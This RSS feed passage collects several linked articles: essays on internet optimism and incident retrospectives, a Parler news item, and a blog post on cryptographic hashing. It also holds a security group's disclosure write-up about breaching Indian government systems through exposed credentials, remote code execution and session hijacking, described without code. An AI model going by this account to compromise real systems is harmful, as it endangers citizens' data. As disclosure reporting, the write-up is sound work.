<p>The problem the present-day internet evangelists is that they believe too fully in the myth of progress, which is what makes them prone to believe that the internet-enabled future will be utopian, or at least a vast improvement over the present. You may find Shirky admitting that the change from the pre-internet to the post-internet age involves some painful transitions (this is his favorite line when it comes to the newspaper industry), but this admission does not cop to the possibility that the pain will simply go on forever, that the post-internet age will simply be objectively worse than the pre-internet age in some important ways. This is abundantly clear in <a href="http://www.shirky.com/weblog/2009/03/newspapers-and-thinking-the-unthinkable/">Shirky’s “Thinking the Unthinkable”</a>, which is refreshingly blunt about the way that the internet has vitiated the old model of journalism, but nonetheless optimistic that things will eventually settle down to a newer, better status quo. Little thought is spared for the possibility that journalism in The Future may just be more sporadic, more partisan, less reliable, and less influential than the journalism of the present–that the models which the internet breaks may never be put back together, and a suitable replacement may never be found.</p>
<p>This is part of the myth of progress: any amount of destruction in the name of progress is acceptible, as all is justified as a necessary step towards The Future. And because the myth of progress is so powerful in our society, almost every new technological advancement is greeted with this same starry-eyed adoration, and all criticism of the role and nature of that technology is powerfully marginalized, at least for a while. Only once a technological change is complete, once the handmaid of The Future has proven once more to be merely the whore of the present, do the forces of criticism, reflection, and conservation begin to come into balance with the forces of progress.</p>
<figure><a href="http://xkcd.com/262/"><img alt="Hey, at least I ran out of staples" src="https://i1.wp.com/imgs.xkcd.com/comics/in_ur_reality.png" title="IN UR REALITY" width="300" height="324"></a><figcaption>IN UR REALITY</figcaption></figure><p>
This is already starting to happen with the internet. Just in the past few months I’ve read <a href="http://www.nybooks.com/articles/archives/2010/nov/25/generation-why/">an excellent, astute discussion of the social damage of Facebook, disguised as a movie review</a>, <a href="http://hnn.us/articles/133910.html">a cranky reminder that the changes wrought by the internet are not as massive as we’d like to think</a>, and <a href="http://www.theatlantic.com/technology/print/2010/12/the-hazards-of-nerd-supremacy-the-case-of-wikileaks/68217/">an impassioned defence of secrecy in the face of Wikileaks</a>. If the internet is plastic, then we’re in the mid 1960’s, when the backlash against plastic was beginning to enter the mainstream but hadn’t yet displaced the previous narrative of plastic triumphalism. And in these critiques it’s easy to see the outlines of a new consensus that may emerge once the internet has fallen out of The Future and into the present: a preference for intimacy and privacy over openness and publicity, a higher, nostalgic value given to face-to-face interations, and a distrust of the culture of the technologists that enable and promote this structure. The geeks will be the new suits, and the creepy guy telling you to go into plastics at a cocktail party will be <a href="http://www.paulgraham.com/start.html">Paul Graham</a>.</p>
<p>It will be some time before the internet completely loses the sheen of The Future. Give it at least a decade. It is nonetheless inevitable—nothing can remain in The Future forever (except maybe the vaporous Singularity), and once the internet becomes firmly rooted in the present, criticism will become fair game. More importantly, once the internet becomes part of the status quo, the myth of progress will begin to work <i>against</i> it rather than <i>for</i> it, as the status quo is by definition not progressive. The open question, it seems to me, is whether internet enthusiasm will come to be seen as merely naïve, or actually evil.</p>
<p>Quaint is the best bet. The current crop of tech-lovers are certainly not evil themselves, and we haven’t yet seen anything that is both clearly evil and fundamentally tied to internet-enabled communication. Wikileaks, though, gives us an interesting glimpse at what may be to come. If a ponce like Julian Assange can embarrass the most powerful country in the world and get away with it, then it’s possible that someone who’s smart, ambitious, and evil could do something similar in a way that would be really disastrous. Our e-Hitler could easily get the sympathy of most of the world’s hackers and geeks, who would gladly participate in an open-source world-domination project written in Python if it were framed in the right way. And if that happened, you’d better believe that the rest of the world would turn against the tech-lovers right quick.</p>
<p>That’s pretty unlikely, though. Plus, who am I kidding? I’m a geek myself, I work for a tech company and I spend all day on the internet. I’m just part of the problem.</p>
			
			
								</div>

			
	</article></div>]]>
            </description>
            <link>https://jsbangs.com/2011/01/09/the-internet-is-made-of-plastic/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26222197</guid>
            <pubDate>Mon, 22 Feb 2021 08:43:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Practiced Humility in Retrospectives]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26222018">thread link</a>) | @kiyanwang
<br/>
February 22, 2021 | https://willgallego.com/2021/02/15/practiced-humility-in-retrospectives/ | <a href="https://web.archive.org/web/*/https://willgallego.com/2021/02/15/practiced-humility-in-retrospectives/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		    
<p>One of the fallacies about our collective approach to retrospectives, incident reviews, and post mortems is the belief that the entire process is a rational machine. Pour in a curated series of events, turn the handle, and out pop all of the action items that need completing to fix the world. I can’t speak to every industry that practices Resilience Engineering, but as for Software Engineering it stems strongly from our belief that we’re fully in control of our environment. We’ve built our tooling, architected our systems, and we’re running the retro. Why wouldn’t we be able to simply apply the calculus to our knowledge and change things for the better?</p>



<p>This all speaks to a distinct lack of humility in what we do as a practice. If we want to better understand the risks we undertake every day and to learn from failures in that work, we need to first accept that failures are in part due to our incomplete understanding, great and small, of our socio-technical systems. Even with a complete working knowledge of everything, we would be unable to act on everything needed to perfect our system, and that underlying system will change despite these efforts. Being comfortable with being wrong means we can change.</p>



<p>This reluctance to accept that things continually fail despite our best efforts, is a common reaction. It’s hard to assume that our systems are continuously in need of tweaks because it’s also hard to accept that they will always run in some form of a degraded state<sup><a rel="noreferrer noopener" href="#complex-systems-run-in-degraded-mode" target="_blank">1</a></sup>. That said, we can fall into the adjacent trap with people being the adaptable element in the system<sup><a rel="noreferrer noopener" href="#human-practitioners-are-the-adaptable-element" target="_blank">2</a></sup> that we are then in the best position to understand the entirety of our system and how best to course correct. The sharp end can be a powerful, if not perilous, position to sit in but it doesn’t guarantee omniscience in the scope of understanding an incident. This is why I frequently suggest that practitioners of retrospectives be folks who weren’t involved in the incident, to help mitigate this failing.</p>



<h2>Hubris as Facilitator</h2>



<p>It’s easy to understand the desire to sit in the facilitator chair. You’re taking the reins of the situation and you’re going to get to the bottom of things. You ask the questions, you drive the conversation and schedule the meeting, but most importantly you’re going to be there to get answers. That would be true if you held a made up title like investigation commander or retrospective captain, but you’re don’t. A facilitator is less the spike and more the bump/set. You’re there to position other folks to learn, not wear the badge.</p>



<p>Retros also come in various shapes and sizes, which makes for another tempting place to be in control. If I’m running the retro, then it can follow my guidelines and my preferred flow. This lesson I learned the hard way, having felt as though I knew “the one true way” to run it. I was there at Etsy watching John Allspaw, Morgan Evans, and Daniel Schauenberg develop and put ink to paper with the <a rel="noreferrer noopener" href="https://extfiles.etsy.com/DebriefingFacilitationGuide.pdf" target="_blank">Etsy Debriefing Guide</a>. In doing so, though, I failed to recognize the microcosm that was Etsy, that what worked for us there didn’t apply universally. Maybe folks had other tools worth surfacing and we should continually look to that to see how we can improve the production of our retros.</p>



<p>Facilitators should instead be the support for everyone else to do the talking and ask questions of their own. We can only share that deep empathy with one another when we put ourselves in one another’s shoes and that can only be done with the understanding of our own fallibility. We too know how awful it feels to be at the center of an incident, that it could have easily been us, which allows us to help recreate the scene and ditch concepts like “human error” as an easy solution to a complex problem.</p>



<p>A singular view of the problem, from that up on high as facilitator, will produce a singular set of answers constrained by our myopic vantage point.</p>



<h2>Top Down Misunderstanding of Retrospectives</h2>



<p>Another failure in our work running retrospectives is senior leadership (individual contributors and management both) using them to impart the illusion of work being done. You’ll see this often in email chains that include a CC list that races its way up the reporting structure. This incident was unacceptable, but don’t worry, <a rel="noreferrer noopener" href="https://www.youtube.com/watch?v=9AKTBHuRv9U" target="_blank">we have top men working on it right now</a>. Similarly, you’ll see public facing reports sent out by companies to reassure customers, the board of directors, and investors that all is well. It’s worth noting that there is value in shared perception being a useful tool for a business to leverage, but it still doesn’t impart learning to folks on either side of the boundaries of a company. The learning review is downgraded for the sake of making an org, at the macro or micro level, appear to be invulnerable to failure. The company cannot tolerate failure because vulnerability must be made an impossibility.</p>



<p>It’s also why so many existing tools are marketed with a primary focus on action items as the work. Going into a retro with the principal desire to create a ToDo list is problematic because the learning becomes a secondary function by nature of prioritization. It has roots in humility such that we’re going into our discussions and interviews believing we can simply solve all the problems in tech and then everything will be perfect from here on, the deeper understanding a “nice to have”.</p>



<p>This is not to give individual contributors in senior positions a pass. How often do we rely on “This is the way we’ve always done it” and our use of best practices<sup><a href="#can-we-trust-best-practices">4</a></sup> as a crutch for decision making rather than challenge established methods? We give folks in senior positions more time for questions during discussions and put them at the front to answer for the sake of expedience. Equally, holding a blameless post mortem can fail if an org values engineers who prioritize their place in the pecking order rather than risk losing face in front of others. Giving less experienced folks time to explore ideas tests the validity of our mental models.</p>



<p>Most importantly, for us to build and revise adaptive capacity<a href="#building-and-revising-adaptive-capacity"><sup>3</sup></a> we have to first acknowledge that the map of our system is potentially inaccurate, a map that is heavily influenced top down. Until we can move towards an acceptance of inaccuracies in our understanding, our assumption stands that we must be right and the view should not change. All of these concepts, and our own journey to them, are themselves a <em>work in progress</em>. There are soft boundaries and holes in the middle where our language and understanding fails us. This does not inherently diminish our work, but can in fact enhance it.</p>



<h2>Humility In Practice</h2>



<p>It’s a fairly given criticism that a lot of our work in applying Resilience Engineering and Human Factors concepts to Software Engineering fail to give concrete examples of putting theory to practice, often leaving it as an exercise to the reader. With that in mind, what does humility first in a retro look like?</p>



<ul><li><strong>A retrospective is a safe place to say “I don’t know”.</strong> A facilitator can and should actively say just that while encouraging others who exhibit similar misgivings about what they can safely hold true. By doing so, it establishes a pattern of being ok with the discomfort of uncertainty.</li><li><strong>Retros should prioritize learning before fixing.</strong> This is not infrequently stated, but bears repeating. As said elsewhere, it also doesn’t exclude action items. Rather, allow folks to freely express what they don’t understand without shame and for improvements to extend from these learning experiences.</li><li><strong>A generosity of spirit is key.</strong> Participants should hold a respect to time shared for other folks to learn, with a particular emphasis on the facilitator. As invaluable as your time is, the up front cost of interviewing folks, organizing meetings, and gathering information is paramount. Put in the extra effort to interview before a retro meeting and follow up after to tie up loose ends.</li><li><strong>There should be a reduction (not an absence) on our use of hindsight.</strong> Acknowledging that we’re all fallible means we can resist the inclination to “fix” an error with counterfactuals when we review past events. Look backwards not as a way to save face but to explore why ideas previously made sense.</li><li><strong>The malleable nature of a retrospective is to review what is assumed to be true.</strong> Confirm or refute assumptions on the narrative as it is assumed to exist regardless of who shares it. Some folks may not be in a position to share, internal pressures against them. Insights often comes from the sharp end, which isn’t always the most tenured engineer.</li><li><strong>All participants should be on equal footing.</strong> Retros are akin to a round table discussion where folks come to share events and ask questions, rather than seniority or management directing the events as to how it may best serve their own interests or those assumed to be of the organization. Don’t let titles dictate who gets to speak.</li><li><strong>Our work in retrospectives is ongoing and adaptable.</strong> Before practitioners get too set in their ways, we should remember that Resilience is a verb<sup><a rel="noreferrer noopener" href="https://willgallego.com/wp-admin/post.php?post=529&amp;action=edit#resilience-is-a-verb" target="_blank">5</a></sup>. Templates are more rigid and predefined, but allowing ourselves the chance to break out of molds, to make mistakes, and explore the boundaries with the assurance that failure is ok, we can practice new ways of pulling out sources of information from our incidents. Our meta discussions surrounding incidents should themselves be challenged.</li></ul>



<p id="complex-systems-run-in-degraded-mode">1. Cook (2002) – <a rel="noreferrer noopener" href="https://how.complexsystems.fail/#5" target="_blank"><em>How Complex Systems Fail: Complex systems run in degraded mode</em></a></p>



<p id="human-practitioners-are-the-adaptable-element">2. Cook (2002) – <a rel="noreferrer noopener" href="https://how.complexsystems.fail/#12" target="_blank"><em>How Complex Systems Fail: Human practitioners are the adaptable element of complex systems</em></a></p>



<p id="building-and-revising-adaptive-capacity">3. Cook, Long (2020) – <a rel="noreferrer noopener" href="https://www.sciencedirect.com/science/article/pii/S0003687020301903" target="_blank"><em>Building and revising adaptive capacity sharing for technical incident response: A case of resilience engineering</em></a></p>



<p id="can-we-trust-best-practices">4. Klein et al (2016) – <a href="https://www.researchgate.net/publication/300343833_Can_We_Trust_Best_Practices_Six_Cognitive_Challenges_of_Evidence-Based_Approaches" target="_blank" rel="noreferrer noopener"><em>Can We Trust Best Practices? Six Cognitive Challenges of Evidence-Based Approaches</em></a></p>



<p id="resilience-is-a-verb">5. Woods (2018) – <a rel="noreferrer noopener" href="https://www.researchgate.net/publication/329035477_Resilience_is_a_Verb" target="_blank"><em>Resilience is a Verb</em></a></p>



<p><em>Photo: <a href="https://www.flickr.com/photos/eyesplash/5307049124" target="_blank" rel="noreferrer noopener">https://www.flickr.com/photos/eyesplash/53070…</a></em></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://willgallego.com/2021/02/15/practiced-humility-in-retrospectives/">https://willgallego.com/2021/02/15/practiced-humility-in-retrospectives/</a></em></p>]]>
            </description>
            <link>https://willgallego.com/2021/02/15/practiced-humility-in-retrospectives/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26222018</guid>
            <pubDate>Mon, 22 Feb 2021 08:09:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Parler Is Back Online]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26221640">thread link</a>) | @jhabdas
<br/>
February 21, 2021 | https://www.ptnewsnetwork.com/parler-is-back-online/ | <a href="https://web.archive.org/web/*/https://www.ptnewsnetwork.com/parler-is-back-online/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-td-block-uid="tdi_83_7f6">

<div>
<p>After big-tech censorship silenced social media company Parler on January 11, 2020, they are back online with new servers as well as new leadership.</p>



<p>Over one month ago Amazon Web Services removed Parler from their servers, taking them offline.&nbsp; Google and Apple also removed them from their app stores. &nbsp; They claimed that the platform was used to “incite, organize, and coordinate the January 6 attack on the US Capitol.”</p>



<p>Defense and National Guard officials, including now former Army Secretary Ryan McCarthy, have stated in interviews that federal law enforcement authorities indicated there was activity relating to the organizing of the Capitol attack on Twitter also.</p>



<p>Parler execs said it was a war on free speech, and Amazon stated that requests to remove violent content, including death threats against public figures were ignored.</p>



<p>In addition, their co-founder and CEO, John Matze was terminated by their board on January 29 over differences in company visions.&nbsp;</p>



<p>Parler’s interim CEO Mark Meckler told<a href="https://justthenews.com/nation/culture/welcome-back-parler-resumes-social-media-app-after-securing-new-computer-servers?utm_source=breaking-newsletter&amp;utm_medium=email&amp;utm_campaign=newsletter#article"> Just the News</a> that “20 million users who were already using the app can begin logging back in on Monday, and new users should be able to sign up in approximately one week.”</p>



<p>“He also said the platform is using artificial intelligence and human editors to police for illegal speech that violates its service agreement but otherwise is remaining true to its free speech, no censorship roots.”</p>



<p>According to his<a href="https://twitter.com/MarkMeckler?s=20"> Twitter</a> account, Meckler is the President of the Convention of States Project, Co-Founder and former National Coordinator of Tea Party Patriots, Constitutional Revolutionary, Husband, Father, and Son.</p>



<p>“Parler is being run by an experienced team and is here to stay,” Meckler said in a statement. “We will thrive as the premier social media platform dedicated to free speech, privacy and civil dialogue.”</p>



<p>There are still some issues with the platform as many people are reporting the site is still not accessible, but it seems their return is imminent.&nbsp;&nbsp;</p>



</div></div></div>]]>
            </description>
            <link>https://www.ptnewsnetwork.com/parler-is-back-online/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26221640</guid>
            <pubDate>Mon, 22 Feb 2021 07:04:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Two Concepts of Constitutive Rules (2018) [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26221628">thread link</a>) | @chordalkeyboard
<br/>
February 21, 2021 | https://www.argumenta.org/wp-content/uploads/2018/11/2-Argumenta-41-Jaap-Hage-Two-Concepts-of-Constitutive-Rules.pdf | <a href="https://web.archive.org/web/*/https://www.argumenta.org/wp-content/uploads/2018/11/2-Argumenta-41-Jaap-Hage-Two-Concepts-of-Constitutive-Rules.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.argumenta.org/wp-content/uploads/2018/11/2-Argumenta-41-Jaap-Hage-Two-Concepts-of-Constitutive-Rules.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-26221628</guid>
            <pubDate>Mon, 22 Feb 2021 07:01:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Indian Government Breached, Massive Amount of Critical Vulnerabilities]]>
            </title>
            <description>
<![CDATA[
Score 293 | Comments 65 (<a href="https://news.ycombinator.com/item?id=26221607">thread link</a>) | @astroanax
<br/>
February 21, 2021 | https://johnjhacking.com/blog/indian-government-breached-massive-amount-of-critical-vulnerabilities/ | <a href="https://web.archive.org/web/*/https://johnjhacking.com/blog/indian-government-breached-massive-amount-of-critical-vulnerabilities/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>A writeup detailing the vulnerability reporting process that took place after Sakura Samurai had breached the Indian Government</p><p>Reading time: 6 minutes.</p><div>
      

<p>Sakura Samurai knew that the Indian Government operated an RVDP (Responsible Vulnerability Disclosure Program). <a href="https://twitter.com/JacksonHHax" title="https://twitter.com/JacksonHHax">Jackson Henry</a> put a list together of initial assets in scope for Sakura Samurai to legally test. <a href="https://twitter.com/rej_ex" title="https://twitter.com/rej_ex">Robert Willis</a> reported that he had found sensitive data and was able to breach police assets. <a href="https://twitter.com/JacksonHHax" title="https://twitter.com/JacksonHHax">Jackson Henry</a> was working in the enumeration processes with his friend, <a href="https://twitter.com/orpheus9001" title="https://twitter.com/orpheus9001">Zultan Holder</a> [not an active Sakura Samurai member] and identified a slew of various attack vectors, immediately resulting in the exposure of many pairs of credentials for databases and other pertinent applications.</p>
<p>The team was informed of the initial enumeration results as they continued to work on the list of assets within scope, while also further jumping into the research and began performing analysis on the sensitive data, identifying additional vectors of attack, exposed PII, and even more credentials.</p>
<p>Sakura Samurai team members included <a href="https://twitter.com/JacksonHHax" title="https://twitter.com/JacksonHHax">Jackson Henry</a>, <a href="https://twitter.com/rej_ex" title="https://twitter.com/rej_ex">Robert Willis</a>, <a href="https://twitter.com/Kirtaner" title="https://twitter.com/Kirtaner">Aubrey Cottle</a>, and<a href="https://twitter.com/johnjhacking" title="https://twitter.com/johnjhacking"> John Jackson</a></p>
<p>In total, the following vulnerabilities were identified, in no specific order:</p>
<ul>
<li>35 Separate Instances of Exposed Credential Pairs (Servers, Important Applications, etc)</li>
<li>3 Instances of Sensitive File Disclosure</li>
<li>5 Exposed private-key pairs for servers</li>
<li>13K+ PII Records [and those are only the records that we were inadvertently exposed to]</li>
<li>Dozens of Exposed Sensitive Police Reports</li>
<li>Session Hijacking Chained via Multiple Vulnerabilities, resulting in the compromise of extremely sensitive government systems</li>
<li>Remote Code Execution on a sensitive financial server; a server that contained large backups of Financial Records</li>
</ul>

<p>First and foremost, it is important to note that so many Critical findings had been identified during our testing that we cannot possibly include all of the vulnerabilities without making this writeup unnecessarily heavy. Therefore, we have opted to include small snippets of repetitive findings in this section. Many variations of application and server credentials also were obtained but the point has already been made.</p>
<p><strong>Exposed Database Credentials</strong></p>
<p><img src="https://johnjhacking.com/uploads/db-creds.png" alt=""><br>
<strong>Private SSH Keys</strong></p>
<p><img src="https://johnjhacking.com/uploads/priv-ssh.png" alt=""></p>
<p><strong>Sensitive File Exposure</strong></p>
<p><img src="https://johnjhacking.com/uploads/sens-file-exp.png" alt=""><br>
<strong>Exposed PHP Mailer Credentials</strong></p>
<p><img src="https://johnjhacking.com/uploads/mailer.png" alt=""></p>

<p><a href="https://twitter.com/rej_ex" title="https://twitter.com/rej_ex">Robert Willis</a> identified an application that resulted in a vulnerability that allowed him to access Sensitive Police Records, containing PII of individuals listed on the report. In addition, sample forensic reports and forensic tooling that is used by the police department was identified by Willis. The exposure of citizen’s sensitive information, some being victims, is a sensitive subject within itself and highly alarming.</p>
<p><img src="https://johnjhacking.com/uploads/police.png" alt=""><br>
<img src="https://johnjhacking.com/uploads/police2.png" alt=""><br>
Shortly after, <a href="https://twitter.com/JacksonHHax" title="https://twitter.com/JacksonHHax">Jackson Henry</a> found a vulnerability that resulted in the exposure of 14,000+ user records. The records included a wide range of sensitive information, including full name, contact info, employee’s department, date of birth, etc. These exposed records along with other various SQL server dumps and Rob’s Police Record Exposure is enough to constitute a data breach without even logging into any of the servers.</p>
<p>Henry identified many credential pairs which could have resulted in even more exploitation of many other people. The PII identified is a small sample of a much larger issue.</p>
<p><img src="https://johnjhacking.com/uploads/14k-records.png" alt=""><br>
<a href="https://twitter.com/johnjhacking" title="https://twitter.com/johnjhacking">John Jackson</a> was able to identify a relevant Remote Code Execution Vulnerability, affecting an out-of-date application residing on one of the government servers. The remote code execution vulnerability allowed for complete access to sensitive files on the server, including the ability to exfiltrate complete backups of financial records [although data exfiltration wasn’t performed to avoid unnecessary action]</p>
<p><img src="https://johnjhacking.com/uploads/rce1.png" alt=""><br>
<img src="https://johnjhacking.com/uploads/rce2.png" alt=""><br>
Finally, <a href="https://www.twitter.com/Kirtaner" title="https://www.twitter.com/Kirtaner">Aubrey Cottle</a> identified the presence of what appeared to be an extremely important application being hosted by the same server that John had achieved successful Remote Code Execution on. Cottle then chained together multiple vulnerabilities in conjunction with the Remote Code Execution vulnerability, resulting in the ability to hijack any user’s session on the web application. The application contained troves of sensitive government data and could have given a threat actor the ability to perform highly-critical, admin-based government actions.</p>
<p><img src="https://johnjhacking.com/uploads/session-chained.png" alt=""></p>

<p>Even though the Indian Government has a RVDP in place, we didn’t feel comfortable disclosing the vulnerabilities right away. The hacking process was far from the standard situation of business-as-usual security research. In total, our report compounded to a massive 34 page report worth of vulnerabilities. We knew that our intent was good, but we wanted to ensure that the US Government had eyes on the situation. Sakura Samurai coordinated with the <a href="https://twitter.com/DC3VDP" title="https://twitter.com/DC3VDP">U.S. DoD Vulnerability Disclosure Program (VDP)</a> to assist in facilitating initial conversations of disclosure. <a href="https://twitter.com/johnjhacking" title="https://twitter.com/johnjhacking">John Jackson</a> spoke with DC3’s Program Manager via email and coordinated on a plan of action.</p>
<p><img src="https://johnjhacking.com/uploads/dc3-1.png" alt=""><br>
Roughly 4 days later, after further communication with the DC3, we felt safe to begin our initial reveal of research on the NCIIPC’s RVDP program.</p>
<p><img src="https://johnjhacking.com/uploads/dc3-2.png" alt=""></p>
<p>In addition, the DC3 also commended the hacking that we did in support of making the cyberspace a better place for everyone.</p>
<p><img src="https://johnjhacking.com/uploads/dc3-3.png" alt=""></p>
<p>Unfortunately, what seemed like a done deal turned out to be quite the unprofessional ride. Any organization knows that fixing breach-worthy vulnerabilities is extremely time sensitive. Once threat actors catch wind of major vulnerabilities against an organization they begin poking on their own, looking for more vectors of attack. Immediately upon revealing that Sakura Samurai was the group responsible for hacking the Indian Government, we followed up with them via Email.</p>
<p><strong>Timeline</strong></p>
<p><strong>2021/02/04</strong> - DC3 begins initial contact with the Indian Government.<br>
<strong>2021/02/08</strong> - Sakura Samurai informs the public that they breached the Government.<br>
<strong>2021/02/08</strong> - Sakura Samurai makes contact with the NCIIPC, noting that the report that they received was a result of their research.<br>
<strong>2021/02/09</strong> - The NCIIPC responds, with a basic acknowledgement and thank you for the research.<br>
<strong>2021/02/09</strong> - Sakura Samurai asks for clarification on patching and the responsibility of breach disclosure to the public.<br>
<strong>2021/02/10</strong> - Sakura Samurai, having received no response, asks for an update on the involved remediation and breach notification processes.<br>
<strong>2021/02/16</strong> - Sakura Samurai once again asks for NCIIPC’s plans for remediation and disclosure.<br>
<strong>2021/02/17</strong> - The NCIIPC makes contact, 7-days later, stating that they will follow up in a short time. Again, we ask about plans of anticipated patching and breach notification to the affected citizens.<br>
<strong>2021/02/19</strong> - In the morning, we ask again about patching and disclosure, 8-hours later and still no response on the matter.<br>
<strong>2021/02/19</strong> - Sakura Samurai reviews the submitted vulnerability report and notes that only about an eighth or less of the submitted Critical Vulnerabilities have been resolved within a two-week period. No notification of breach has occurred even though Government Employees and Indian Citizens are at risk of exploitation from threat actors.</p>

<p>Governments have an obligation to protect the private data of its employees and citizens. In addition, the exposure of proprietary government data can be used for great means of manipulation and for other destructive purposes. While the NCIIPC operates a Responsible Vulnerability Disclosure Program, the recklessness and avoidance of communication represents the complete opposite of a responsible program. A failure to release notification of breach to affected citizens and to patch highly-critical vulnerabilities in a timely manner reflects poorly on the state of their Information Security posture. The clock to patch vulnerabilities began immediately when the DC3 contacted the NCIIPC via Twitter, as it is a highly visible space - one which threat actors avidly monitor.</p>
<p>Sakura Samurai urge the NCIIPC to patch the remainder of the vulnerabilities. The criticality of some of the issues cannot wait weeks or months for adequate resolution.</p>
<hr>
<p><strong>Check out our website</strong><br>
<a href="https://sakurasamurai.org/" title="https://sakurasamurai.org">https://sakurasamurai.org</a></p>
<p><strong><em>Twitter Links:</em></strong><br>
Main Page<br>
<a href="https://twitter.com/SakuraSamuraii" title="https://twitter.com/SakuraSamuraii">https://twitter.com/SakuraSamuraii</a><br>
Founders<br>
<a href="https://twitter.com/johnjhacking" title="https://twitter.com/johnjhacking">https://twitter.com/johnjhacking</a><br>
<a href="https://twitter.com/nicksahler" title="https://twitter.com/nicksahler">https://twitter.com/nicksahler</a><br>
Members<br>
<a href="https://twitter.com/JacksonHHax" title="https://twitter.com/JacksonHHax">https://twitter.com/JacksonHHax</a><br>
<a href="https://twitter.com/Kirtaner" title="https://twitter.com/Kirtaner">https://twitter.com/Kirtaner</a><br>
<a href="https://twitter.com/rej_ex" title="https://twitter.com/rej_ex">https://twitter.com/rej_ex</a><br>
<a href="https://twitter.com/endingwithali" title="https://twitter.com/endingwithali">https://twitter.com/endingwithali</a><br>
Collaborator<br>
<a href="https://twitter.com/orpheus9001" title="https://twitter.com/orpheus9001">https://twitter.com/orpheus9001</a></p>

    </div></div>]]>
            </description>
            <link>https://johnjhacking.com/blog/indian-government-breached-massive-amount-of-critical-vulnerabilities/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26221607</guid>
            <pubDate>Mon, 22 Feb 2021 06:57:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Data Immutability, Verifiability and Integrity Without the Blockchain Overhead]]>
            </title>
            <description>
<![CDATA[
Score 38 | Comments 9 (<a href="https://news.ycombinator.com/item?id=26221324">thread link</a>) | @sidcool
<br/>
February 21, 2021 | https://techtake.info/2021/02/16/data-immutability-verifiability-and-integrity-without-the-blockchain-overhead/ | <a href="https://web.archive.org/web/*/https://techtake.info/2021/02/16/data-immutability-verifiability-and-integrity-without-the-blockchain-overhead/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Whenever a software project needs to implement immutable records, people often start thinking of Blockchain or <strong>D</strong>istributed <strong>L</strong>edger <strong>T</strong>echnology like Hyperledger. Blockchain and DLT make use of cryptographic techniques that enable immutability, verifiability and integrity checks. However, Blockchain and DLT need much more than just these checks. It needs to prevent all the attempts of a double-spend by potential malicious users. In a trust-less environment it needs implementation of complex protocols which leads to consumption of huge amount of electricity. This makes writing data on Blockchain costly. DLTs like Hyperledger make use of simpler consensus algorithms between a “set of trusted nodes”, which reduces the cost. However, it still incurs significant costs if nothing more than immutability, verifiability and integrity were the concern.</p>



<p>This post is about how to implement data immutability, verifiability and integrity without using a Blockchain or a DLT in industrial strength software applications.</p>



<ul><li><a href="#foundation">Foundational technique</a><ul><li><a href="#hash-function">Cryptographic hash function</a></li></ul></li><li><a href="#verifiability">Verifiability</a><ul><li><a href="#verify-id">Deterministic and Verifiable IDs</a></li><li><a href="#data-format">Data format and ID Generation</a></li></ul></li><li><a href="#immutability">Immutability and Verifiability</a><ul><li><a href="#merkel-dag">Merkel DAG and immutable data structures</a></li><li><a href="#mutation">Mutation</a></li></ul></li><li><a href="#integrity">Immutability, Verifiability and Integrity</a><ul><li><a href="#application">More applications</a></li></ul></li><li><a href="#future-proof">Future-proofing</a><ul><li><a href="#multi-hash">Multihash</a></li></ul></li></ul>



<h2 id="foundation">Foundational technique – Cryptographic Hashing</h2>



<p>To understand the solution, some foundational techniques must be understood. This section describes what is cryptographic hashing. Those who are already aware of cryptographic hashing, they may skip to the next section.</p>



<h4 id="hash-function">Cryptographic hash function</h4>



<p>If you provide a stream of bytes to a cryptographic hash function, it generates a number called hash (also referred to as digest). The following properties make it a very useful tool:</p>



<ol><li>It is impossible to guess the generated hash value for a stream of bytes. To get the hash value, one has to run the algorithm, there is no shortcut.</li><li>For a given input it always generates the same hash value.</li><li>It is infeasible to deduce the input based on the hash value. That means it is an irreversible mathematical function.</li><li>No two different stream of bytes result in the same hash value. Even a small change in the input stream generates a totally different number.&nbsp;<em>(When two different stream of bytes produce the same hash value, we say the cryptographic hash function is broken. It is also referred to as there is a collision in the cryptographic hash function.)</em></li><li>Any size of input stream will always result in the same size of hash value. Some hash functions generate hash values that are 256 bits long. If those functions are used, the result will always be 256 bits long.</li></ol>



<p>Examples of commonly used cryptographic hash functions include:</p>



<ul><li>SHA-256 (returns 256 bit&nbsp;unsigned integers)</li><li>RIPEMD-160 (returns 160 bit unsigned integers)</li></ul>



<p>Sample hash values:</p>



<figure><table><tbody><tr><td><strong>Input</strong></td><td><strong>SHA-256</strong></td><td><strong>RIPEMD-160</strong></td></tr><tr><td>Hello world</td><td>0x64ec88ca00b268e5ba1a35678a1b5316d212f4f366b2477232534a8aeca37f3c</td><td>0xdbea7bd24eef40a2e79387542e36dd408b77b21a</td></tr><tr><td>Hello world.</td><td>0xaa3ec16e6acc809d8b2818662276256abfd2f1b441cb51574933f3d4bd115d11</td><td>0x6ad34a17d22d67a7ab02710ae9eb6f282cb1d787</td></tr><tr><td>Unrelated, totally.</td><td>0x2bd72f5c4300444890325b3363ef2027f30ed38797c3133dbc62a90564976458</td><td>0x51cb1844d22a00d5f659795e0b1c339c6fa1a8bc</td></tr></tbody></table><figcaption>Hex representation of SHA-256 and RIPEMD-160 hash values for different inputs</figcaption></figure>



<p>There are two things we observe from the table above:</p>



